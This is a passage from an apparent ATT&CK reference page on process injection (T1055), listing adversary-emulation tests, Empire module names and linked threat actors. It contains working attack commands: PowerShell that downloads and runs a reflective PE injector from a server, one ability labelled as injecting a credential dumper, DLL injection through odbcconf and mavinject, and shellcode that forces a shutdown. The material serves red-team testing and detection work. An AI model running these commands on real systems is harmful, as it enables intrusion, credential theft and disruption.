                                                                                                     ']; '
                                                                                                     'then '
                                                                                                     'exit '
                                                                                                     '0; '
                                                                                                     'else '
                                                                                                     'exit '
                                                                                                     '1; '
                                                                                                     'fi;\n'}],
                                                                 'dependency_executor_name': 'bash',
                                                                 'description': 'This '
                                                                                'test '
                                                                                'injects '
                                                                                'a '
                                                                                'shared '
                                                                                'object '
                                                                                'library '
                                                                                'via '
                                                                                'the '
                                                                                'LD_PRELOAD '
                                                                                'environment '
                                                                                'variable '
                                                                                'to '
                                                                                'execute. '
                                                                                'This '
                                                                                'technique '
                                                                                'was '
                                                                                'used '
                                                                                'by '
                                                                                'threat '
                                                                                'actor '
                                                                                'Rocke '
                                                                                'during '
                                                                                'the '
                                                                                'exploitation '
                                                                                'of '
                                                                                'Linux '
                                                                                'web '
                                                                                'servers. '
                                                                                'This '
                                                                                'requires '
                                                                                'the '
                                                                                '`glibc` '
                                                                                'package.\n'
                                                                                '\n'
                                                                                'Upon '
                                                                                'successful '
                                                                                'execution, '
                                                                                'bash '
                                                                                'will '
                                                                                'utilize '
                                                                                'LD_PRELOAD '
                                                                                'to '
                                                                                'load '
                                                                                'the '
                                                                                'shared '
                                                                                'object '
                                                                                'library '
                                                                                '`/etc/ld.so.preload`. '
                                                                                'Output '
                                                                                'will '
                                                                                'be '
                                                                                'via '
                                                                                'stdout.\n',
                                                                 'executor': {'command': 'LD_PRELOAD=#{path_to_shared_library} '
                                                                                         'ls\n',
                                                                              'elevation_required': False,
                                                                              'name': 'bash'},
                                                                 'input_arguments': {'path_to_shared_library': {'default': 'PathToAtomicsFolder/T1055/bin/T1055.so',
                                                                                                                'description': 'Path '
                                                                                                                               'to '
                                                                                                                               'a '
                                                                                                                               'shared '
                                                                                                                               'library '
                                                                                                                               'object',
                                                                                                                'type': 'Path'},
                                                                                     'path_to_shared_library_source': {'default': 'PathToAtomicsFolder/T1055/src/Linux/T1055.c',
                                                                                                                       'description': 'Path '
                                                                                                                                      'to '
                                                                                                                                      'a '
                                                                                                                                      'shared '
                                                                                                                                      'library '
                                                                                                                                      'source '
                                                                                                                                      'code',
                                                                                                                       'type': 'Path'}},
                                                                 'name': 'Shared '
                                                                         'Library '
                                                                         'Injection '
                                                                         'via '
                                                                         'LD_PRELOAD',
                                                                 'supported_platforms': ['linux']},
                                                                {'auto_generated_guid': '611b39b7-e243-4c81-87a4-7145a90358b1',
                                                                 'description': 'Process '
                                                                                'Injection '
                                                                                'using '
                                                                                'C#\n'
                                                                                'reference: '
                                                                                'https://github.com/pwndizzle/c-sharp-memory-injection\n'
                                                                                'Excercises '
                                                                                'Five '
                                                                                'Techniques\n'
                                                                                '1. '
                                                                                'Process '
                                                                                'injection\n'
                                                                                '2. '
                                                                                'ApcInjectionAnyProcess\n'
                                                                                '3. '
                                                                                'ApcInjectionNewProcess\n'
                                                                                '4. '
                                                                                'IatInjection\n'
                                                                                '5. '
                                                                                'ThreadHijack\n'
                                                                                'Upon '
                                                                                'successful '
                                                                                'execution, '
                                                                                'cmd.exe '
                                                                                'will '
                                                                                'execute '
                                                                                'T1055.exe, '
                                                                                'which '
                                                                                'exercises '
                                                                                '5 '
                                                                                'techniques. '
                                                                                'Output '
                                                                                'will '
                                                                                'be '
                                                                                'via '
                                                                                'stdout.\n',
                                                                 'executor': {'command': '.\\bin\\#{exe_binary}\n',
                                                                              'name': 'command_prompt'},
                                                                 'input_arguments': {'exe_binary': {'default': 'T1055.exe',
                                                                                                    'description': 'Output '
                                                                                                                   'Binary',
                                                                                                    'type': 'Path'}},
                                                                 'name': 'Process '
                                                                         'Injection '
                                                                         'via '
                                                                         'C#',
                                                                 'supported_platforms': ['windows']},
                                                                {'auto_generated_guid': 'fa5a2759-41d7-4e13-a19c-e8f28a53566f',
                                                                 'description': 'svchost.exe '
                                                                                'writing '
                                                                                'a '
                                                                                'non-Microsoft '
                                                                                'Office '
                                                                                'file '
                                                                                'to '
                                                                                'a '
                                                                                'file '
                                                                                'with '
                                                                                'a '
                                                                                'UNC '
                                                                                'path.\n'
                                                                                'Upon '
                                                                                'successful '
                                                                                'execution, '
                                                                                'this '
                                                                                'will '
                                                                                'rename '
                                                                                'cmd.exe '
                                                                                'as '
                                                                                'svchost.exe '
                                                                                'and '
                                                                                'move '
                                                                                'it '
                                                                                'to '
                                                                                '`c:\\`, '
                                                                                'then '
                                                                                'execute '
                                                                                'svchost.exe '
                                                                                'with '
                                                                                'output '
                                                                                'to '
                                                                                'a '
                                                                                'txt '
                                                                                'file.\n',
                                                                 'executor': {'cleanup_command': 'del '
                                                                                                 'C:\\T1055.txt '
                                                                                                 '>nul '
                                                                                                 '2>&1\n'
                                                                                                 'del '
                                                                                                 'C:\\svchost.exe '
                                                                                                 '>nul '
                                                                                                 '2>&1\n',
                                                                              'command': 'copy '
                                                                                         'C:\\Windows\\System32\\cmd.exe '
                                                                                         'C:\\svchost.exe\n'
                                                                                         'C:\\svchost.exe '
                                                                                         '/c '
                                                                                         'echo '
                                                                                         'T1055 '
                                                                                         '> '
                                                                                         '\\\\localhost\\c$\\T1055.txt\n',
                                                                              'elevation_required': True,
                                                                              'name': 'command_prompt'},
                                                                 'name': 'svchost '
                                                                         'writing '
                                                                         'a '
                                                                         'file '
                                                                         'to a '
                                                                         'UNC '
                                                                         'path',
                                                                 'supported_platforms': ['windows']}],
                                               'attack_technique': 'T1055',
                                               'display_name': 'Process '
                                                               'Injection'}},
 {'Mitre Stockpile - Injects cred dumper exe into an available process': {'description': 'Injects '
                                                                                         'cred '
                                                                                         'dumper '
                                                                                         'exe '
                                                                                         'into '
                                                                                         'an '
                                                                                         'available '
                                                                                         'process',
                                                                          'id': 'c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7',
                                                                          'name': 'Inject '
                                                                                  'Cred '
                                                                                  'dumper '
                                                                                  'into '
                                                                                  'process '
                                                                                  '(Spookier)',
                                                                          'platforms': {'windows': {'psh': {'command': '$url="#{server}/file/download";\n'
                                                                                                                       '$wc=New-Object '
                                                                                                                       'System.Net.WebClient;\n'
                                                                                                                       '$wc.Headers.add("file","debugger.dll");\n'
                                                                                                                       '$PBytes '
                                                                                                                       '= '
                                                                                                                       '$wc.DownloadData($url);\n'
                                                                                                                       '$wc1 '
                                                                                                                       '= '
                                                                                                                       'New-Object '
                                                                                                                       'System.net.webclient;\n'
                                                                                                                       '$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\n'
                                                                                                                       'IEX '
                                                                                                                       '($wc1.DownloadString($url));\n'
                                                                                                                       'Invoke-ReflectivePEInjection '
                                                                                                                       '-PBytes '
                                                                                                                       '$PBytes '
                                                                                                                       '-verbose'}}},
                                                                          'tactic': 'credential-access',
                                                                          'technique': {'attack_id': 'T1055',
                                                                                        'name': 'Process '
                                                                                                'Injection'}}},
 {'Mitre Stockpile - Injects sandcat DLL into an available process': {'description': 'Injects '
                                                                                     'sandcat '
                                                                                     'DLL '
                                                                                     'into '
                                                                                     'an '
                                                                                     'available '
                                                                                     'process',
                                                                      'id': 'a398986f-31b0-436a-87e9-c8e82c028f3c',
                                                                      'name': 'Inject '
                                                                              'Sandcat '
                                                                              'into '
                                                                              'process',
                                                                      'platforms': {'windows': {'psh': {'command': '$url="#{server}/file/download";\n'
                                                                                                                   '$wc=New-Object '
                                                                                                                   'System.Net.WebClient;\n'
                                                                                                                   '$wc.Headers.add("platform","windows");\n'
                                                                                                                   '$wc.Headers.add("file","shared.go");\n'
                                                                                                                   '$wc.Headers.add("server","#{server}");\n'
                                                                                                                   '$PEBytes '
                                                                                                                   '= '
                                                                                                                   '$wc.DownloadData($url);\n'
                                                                                                                   '$wc1 '
                                                                                                                   '= '
                                                                                                                   'New-Object '
                                                                                                                   'System.net.webclient;\n'
                                                                                                                   '$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\n'
                                                                                                                   'IEX '
                                                                                                                   '($wc1.DownloadString($url));\n'
                                                                                                                   'Invoke-ReflectivePEInjection '
                                                                                                                   '-verbose '
                                                                                                                   '-PBytes '
                                                                                                                   '$PEbytes '
                                                                                                                   '-ProcId '
                                                                                                                   '#{host.process.id}\n'}}},
                                                                      'requirements': [{'plugins.stockpile.app.requirements.paw_provenance': [{'source': 'host.process.id'}]}],
                                                                      'tactic': 'defense-evasion',
                                                                      'technique': {'attack_id': 'T1055',
                                                                                    'name': 'Process '
                                                                                            'Injection'}}},
 {'Mitre Stockpile - Leverage odbcconf for DLL injection': {'description': 'Leverage '
                                                                           'odbcconf '
                                                                           'for '
                                                                           'DLL '
                                                                           'injection',
                                                            'id': 'a74bc239-a196-4f7e-8d5c-fe8c0266071c',
                                                            'name': 'Signed '
                                                                    'Binary '
                                                                    'Execution '
                                                                    '- '
                                                                    'odbcconf',
                                                            'platforms': {'windows': {'psh': {'command': 'odbcconf.exe '
                                                                                                         '/S '
                                                                                                         '/A '
                                                                                                         '{REGSVR '
                                                                                                         '"C:\\Users\\Public\\sandcat.dll"}\n'}}},
                                                            'tactic': 'defense-evasion',
                                                            'technique': {'attack_id': 'T1055',
                                                                          'name': 'Process '
                                                                                  'Injection'}}},
 {'Mitre Stockpile - Leverage Mavinject (signed binary) for DLL injection': {'description': 'Leverage '
                                                                                            'Mavinject '
                                                                                            '(signed '
                                                                                            'binary) '
                                                                                            'for '
                                                                                            'DLL '
                                                                                            'injection',
                                                                             'id': 'e5bcefee-262d-4568-a261-e8a20855ec81',
                                                                             'name': 'Signed '
                                                                                     'Binary '
                                                                                     'Execution '
                                                                                     '- '
                                                                                     'Mavinject',
                                                                             'platforms': {'windows': {'psh': {'command': '$explorer '
                                                                                                                          '= '
                                                                                                                          'Get-Process '
                                                                                                                          '-Name '
                                                                                                                          'explorer;\n'
                                                                                                                          'mavinject.exe '
                                                                                                                          '$explorer.id '
                                                                                                                          'C:\\Users\\Public\\sandcat.dll\n'}}},
                                                                             'tactic': 'defense-evasion',
                                                                             'technique': {'attack_id': 'T1055',
                                                                                           'name': 'Process '
                                                                                                   'Injection'}}},
 {'Mitre Stockpile - Force shutdown a target system using Process Injection and raw shellcode': {'description': 'Force '
                                                                                                                'shutdown '
                                                                                                                'a '
                                                                                                                'target '
                                                                                                                'system '
                                                                                                                'using '
                                                                                                                'Process '
                                                                                                                'Injection '
                                                                                                                'and '
                                                                                                                'raw '
                                                                                                                'shellcode',
                                                                                                 'id': '0821b0b0-7902-4a7b-8052-80bda5a43684',
                                                                                                 'name': 'Shutdown '
                                                                                                         'Target '
                                                                                                         'System',
                                                                                                 'platforms': {'linux': {'shellcode_amd64,shellcode_386': {'command': '0x48, '
                                                                                                                                                                      '0x31, '
                                                                                                                                                                      '0xc0, '
                                                                                                                                                                      '0x48, '
                                                                                                                                                                      '0x31, '
                                                                                                                                                                      '0xd2, '
                                                                                                                                                                      '0x50, '
                                                                                                                                                                      '0x6a, '
                                                                                                                                                                      '0x77, '
                                                                                                                                                                      '0x66, '
                                                                                                                                                                      '0x68, '
                                                                                                                                                                      '0x6e, '
                                                                                                                                                                      '0x6f, '
                                                                                                                                                                      '0x48, '
                                                                                                                                                                      '0x89, '
                                                                                                                                                                      '0xe3, '
                                                                                                                                                                      '0x50, '
                                                                                                                                                                      '0x66, '
                                                                                                                                                                      '0x68, '
                                                                                                                                                                      '0x2d, '
                                                                                                                                                                      '0x68, '
                                                                                                                                                                      '0x48, '
                                                                                                                                                                      '0x89, '
                                                                                                                                                                      '0xe1, '
                                                                                                                                                                      '0x50, '
                                                                                                                                                                      '0x49, '
                                                                                                                                                                      '0xb8, '
                                                                                                                                                                      '0x2f, '
                                                                                                                                                                      '0x73, '
                                                                                                                                                                      '0x62, '
                                                                                                                                                                      '0x69, '
                                                                                                                                                                      '0x6e, '
                                                                                                                                                                      '0x2f, '
                                                                                                                                                                      '0x2f, '
                                                                                                                                                                      '0x2f, '
                                                                                                                                                                      '0x49, '
                                                                                                                                                                      '0xba, '
                                                                                                                                                                      '0x73, '
                                                                                                                                                                      '0x68, '
                                                                                                                                                                      '0x75, '
                                                                                                                                                                      '0x74, '
                                                                                                                                                                      '0x64, '
                                                                                                                                                                      '0x6f, '
                                                                                                                                                                      '0x77, '
                                                                                                                                                                      '0x6e, '
                                                                                                                                                                      '0x41, '
                                                                                                                                                                      '0x52, '
                                                                                                                                                                      '0x41, '
                                                                                                                                                                      '0x50, '
                                                                                                                                                                      '0x48, '
                                                                                                                                                                      '0x89, '
                                                                                                                                                                      '0xe7, '
                                                                                                                                                                      '0x52, '
                                                                                                                                                                      '0x53, '
                                                                                                                                                                      '0x51, '
                                                                                                                                                                      '0x57, '
                                                                                                                                                                      '0x48, '
                                                                                                                                                                      '0x89, '
                                                                                                                                                                      '0xe6, '
                                                                                                                                                                      '0x48, '
                                                                                                                                                                      '0x83, '
                                                                                                                                                                      '0xc0, '
                                                                                                                                                                      '0x3b, '
                                                                                                                                                                      '0x0f, '
                                                                                                                                                                      '0x05\n'}}},
                                                                                                 'tactic': 'privilege-escalation',
                                                                                                 'technique': {'attack_id': 'T1055',
                                                                                                               'name': 'Process '
                                                                                                                       'Injection'}}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/code_execution/invoke_reflectivepeinjection":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/code_execution/invoke_reflectivepeinjection',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/code_execution/invoke_shellcode":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/code_execution/invoke_shellcode',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/code_execution/invoke_shellcodemsil":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/code_execution/invoke_shellcodemsil',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/credential_injection":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/credentials/credential_injection',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/psinject":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/management/psinject',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/reflective_inject":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/management/reflective_inject',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/shinject":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/management/shinject',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/management/osx/shellcodeinject64":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'python/management/osx/shellcodeinject64',
                                            'Technique': 'Process Injection'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations

None

# Actors


* [Gorgon Group](../actors/Gorgon-Group.md)

* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Turla](../actors/Turla.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [APT37](../actors/APT37.md)
    
* [PLATINUM](../actors/PLATINUM.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
* [Honeybee](../actors/Honeybee.md)
    
* [Putter Panda](../actors/Putter-Panda.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [APT41](../actors/APT41.md)
    
